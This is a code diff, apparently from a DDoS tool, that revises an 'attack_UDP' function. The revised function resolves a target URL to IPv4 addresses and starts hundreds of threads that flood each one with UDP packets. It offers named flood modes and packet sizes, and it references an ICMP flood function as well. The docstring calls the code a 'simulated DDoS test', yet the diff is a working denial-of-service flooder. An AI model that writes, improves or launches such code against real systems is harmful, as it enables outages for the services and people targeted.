@@ -80,56 +80,59 @@ def udp_worker(stop_event, packet_size, host, port):
 
 # --- Your Corrected Test Function ---
 
-def attack_UDP(method, host, port, duration, threads_per_method=100):
+def attack_UDP(method, host_url, port, duration, threads_per_method=100):
     """
     Runs a simulated DDoS test for a specific duration.
 
     :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix")
-    :param host: Target IP address
+    :param host_url: Target url
     :param port: Target port
     :param duration: How long the test should run, in seconds
     :param threads_per_method: How many concurrent threads to spawn for each task
     """
-    print(f"--- Starting test: {method} on {host}:{port} for {duration} seconds ---")
 
-    # A threading.Event is a safe way to signal threads to stop.
-    stop_event = threading.Event()
-    threads = []
+    hosts = resolve_to_ipv4(host_url)
+    for host in hosts:
+        print(f"--- Starting test: {method} on {host}:{port} for {duration} seconds ---")
 
-    # A helper function to create and start a thread
-    def launch_thread(size):
-        # Note: we use `args` to pass arguments to the target function
-        thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
-        thread.daemon = True  # Daemon threads will exit when the main program exits
-        thread.start()
-        threads.append(thread)
+        # A threading.Event is a safe way to signal threads to stop.
+        stop_event = threading.Event()
+        threads = []
 
-    if method == "UDP-Flood":
-        for _ in range(threads_per_method):
-            launch_thread(375)
-    elif method == "UDP-Power":
-        for _ in range(threads_per_method):
-            launch_thread(750)
-    elif method == "UDP-Mix":
-        for _ in range(threads_per_method):
-            launch_thread(375)
-            launch_thread(750)
-    else:
-        print(f"Error: Unknown method '{method}'")
-        return  # Exit the function if the method is invalid
+        # A helper function to create and start a thread
+        def launch_thread(size):
+            # Note: we use `args` to pass arguments to the target function
+            thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
+            thread.daemon = True  # Daemon threads will exit when the main program exits
+            thread.start()
+            threads.append(thread)
 
-    # Let the threads run for the specified duration
-    time.sleep(duration)
+        if method == "UDP-Flood":
+            for _ in range(threads_per_method):
+                launch_thread(375)
+        elif method == "UDP-Power":
+            for _ in range(threads_per_method):
+                launch_thread(750)
+        elif method == "UDP-Mix":
+            for _ in range(threads_per_method):
+                launch_thread(375)
+                launch_thread(750)
+        else:
+            print(f"Error: Unknown method '{method}'")
+            return  # Exit the function if the method is invalid
 
-    # The timer has expired, now we signal the threads to stop
-    print("\n--- Timeout reached. Signaling threads to stop... ---")
-    stop_event.set()
+        # Let the threads run for the specified duration
+        time.sleep(duration)
 
-    # (Optional but good practice) Wait for all threads to finish cleanly
-    # for thread in threads:
-    #     thread.join()
+        # The timer has expired, now we signal the threads to stop
+        print("\n--- Timeout reached. Signaling threads to stop... ---")
+        stop_event.set()
 
-    print(f"--- Test function for {method} has finished. ---")
+        # (Optional but good practice) Wait for all threads to finish cleanly
+        # for thread in threads:
+        #     thread.join()
+
+        print(f"--- Test function for {method} has finished. ---")
 
 
 def icmpflood(target_url, cycle):
